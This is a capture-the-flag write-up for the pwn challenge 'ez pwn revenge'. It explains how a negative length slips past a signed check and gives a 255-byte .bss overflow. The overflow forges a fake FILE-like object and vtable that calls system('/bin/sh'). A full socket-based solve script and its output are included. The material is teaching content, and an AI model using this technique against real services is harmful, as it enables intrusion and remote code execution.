---
title: Ez Pwn Revenge
date: 2026-07-06
tags:
- pwn
- LYKNCTF
---

- **Challenge:** ez pwn revenge
- **Category:** Pwn
- **Flag:** `LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}`

---

## My initial read / first impressions

The challenge description was literally:

```text
:sob:
```

So, very helpful.

Connecting to the service gave this prompt:

```text
Let me know the length of your buffer:
```

This looked like another small pwn challenge built around a bad length check. The program asks for a length first, then asks for the actual input:

```text
okay, so your length is -1
>
```

The interesting part was that negative lengths were accepted. That usually means the program checks the length as a signed integer, but later uses it in some unsigned context.

## The bug

The core issue was a signedness / truncation bug.

The program checks that the requested length is not too big, something like:

```c
if (len > 0x50) {
    exit(1);
}
```

That blocks normal oversized values, but it does not block negative values. So `-1` passes the check because `-1 <= 0x50`.

Later, that same length gets reused as the size for the read, but in a way that effectively turns `-1` into `0xff`:

```text
-1 -> 0xff -> 255 bytes
```

So instead of only getting a small safe write, we can send 255 bytes into the program's global buffer.

That gives us enough room to overwrite the fake structure that the binary uses later.

## What we overwrite

The binary was not a normal stack overflow. The useful target was in `.bss`.

The important addresses were fixed because the binary had no PIE:

```python
BOX        = 0x404040
FP         = BOX + 0x60      # 0x4040a0
SYSTEM_PLT = 0x401040
FAKE_VTAB  = BOX + 0xb0
```

The program later calls a custom close function on a fake file-like object at `0x4040a0`. It is not real glibc FSOP, but it has the same general idea: there is a struct with fields that must pass checks, then a vtable pointer is used for an indirect call.

So the goal is:

```text
1. Use -1 as the length.
2. Overflow the .bss buffer with 255 bytes.
3. Build a fake FILE-ish object at 0x4040a0.
4. Point its fake vtable to data we control.
5. Put system@plt as the vtable function.
6. Make the object itself start with /bin/sh so system(fp) becomes system("/bin/sh").
```

That last part is the clean trick. The indirect call passes the fake file pointer as the first argument. On x86_64, the first argument is in `rdi`, so if the pointer points to the string `/bin/sh`, the call becomes:

```c
system("/bin/sh");
```

## Building the fake object

The payload starts as 255 bytes because `-1` becomes `0xff`:

```python
payload = bytearray(b"A" * 0xff)
```

There were a couple of checks before the fake close call. To avoid failing those, I set the early-check fields like this:

```python
payload[0x50:0x54] = p32(0)
payload[0x58:0x60] = p64(0xdeadbeefcafebabe)
```

Then at offset `0x60`, which is where the fake file pointer points, I put `/bin/sh`:

```python
payload[0x60:0x68] = b"/bin/sh\x00"
```

The custom close function also checks a few fake file fields. These values are just enough to make it happy:

```python
payload[0x70:0x78] = p64(0xfbad0000)
payload[0x80:0x88] = p64(2)
payload[0x88:0x90] = p64(1)
```

Finally, I overwrite the vtable pointer and place `system@plt` in the fake vtable:

```python
payload[0xa8:0xb0] = p64(FAKE_VTAB)
payload[0xb0:0xb8] = p64(SYSTEM_PLT)
```

After that, when the program reaches the fake close logic, it calls our fake vtable entry and spawns a shell.

## Exploitation

This is the full solve script I used:

```python
#!/usr/bin/env python3
import socket
import struct
import time
import re
import sys

HOST = "15.235.202.47"
PORT = 8996


def p32(x):
    return struct.pack("<I", x)


def p64(x):
    return struct.pack("<Q", x)


def recv_some(s, timeout=1.0):
    s.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
            if len(chunk) < 4096:
                break
        except socket.timeout:
            break
    return out


def recv_until(s, token, timeout=5.0):
    s.settimeout(timeout)
    out = b""
    while token not in out:
        try:
            chunk = s.recv(1)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            break
    return out


# Binary constants: no PIE
BOX        = 0x404040
FP         = BOX + 0x60
SYSTEM_PLT = 0x401040
FAKE_VTAB  = BOX + 0xb0

# scanf accepts signed int <= 0x50, but read length is the low byte.
# -1 becomes 0xff, giving us a 255-byte .bss overwrite.
payload = bytearray(b"A" * 0xff)

# Avoid the fake-flag early-exit check.
payload[0x50:0x54] = p32(0)
payload[0x58:0x60] = p64(0xdeadbeefcafebabe)

# system() receives rdi = FP, so put "/bin/sh" at FP.
payload[0x60:0x68] = b"/bin/sh\x00"

# Satisfy custom_fclose's fake FILE checks.
payload[0x70:0x78] = p64(0xfbad0000)
payload[0x80:0x88] = p64(2)
payload[0x88:0x90] = p64(1)

# Overwrite vtable pointer, then fake vtable[0] = system@plt.
payload[0xa8:0xb0] = p64(FAKE_VTAB)
payload[0xb0:0xb8] = p64(SYSTEM_PLT)

s = socket.create_connection((HOST, PORT), timeout=8)

print(recv_until(s, b"buffer:", timeout=5).decode(errors="ignore"), end="")
s.sendall(b"-1\n")

print(recv_until(s, b">", timeout=5).decode(errors="ignore"), end="")
s.sendall(payload)

time.sleep(0.2)

# We should now be inside /bin/sh.
cmd = b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit\n"
s.sendall(cmd)

time.sleep(0.5)
out = recv_some(s, timeout=3.0)

print(out.decode(errors="ignore"))

m = re.search(rb"LYKNCTF\{[^}]+\}", out)
if m:
    print("[+] FLAG:", m.group(0).decode())
else:
    print("[-] No flag found in output.")
```

Running it gave:

```text
Let me know the length of your buffer:
okay, so your length is -1
>
Let's me check if you are safe or not!
You doing it right. Are you?
Your overflow attempt is 999999
LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
bye.

[+] FLAG: LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
```

## Why this works

The length validation only thinks about positive values. It tries to stop large buffers, but `-1` slips through because it is signed.

Then, when the read size is calculated, `-1` effectively turns into `255`, which gives enough space to corrupt the fake file object in `.bss`.

The rest of the exploit is just setting up the fake object so the program voluntarily calls through a function pointer we control:

```text
length = -1
    -> signed check passes
    -> read length becomes 0xff
    -> overwrite fake FILE-ish object
    -> fake vtable points to our controlled area
    -> fake vtable entry is system@plt
    -> first argument points at "/bin/sh"
    -> system("/bin/sh")
    -> cat flag
```

So this was basically a signedness bug chained into fake-vtable control. Not a normal ret2win, but still very direct once the fake object layout is mapped out.

## Flag

```text
LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
```
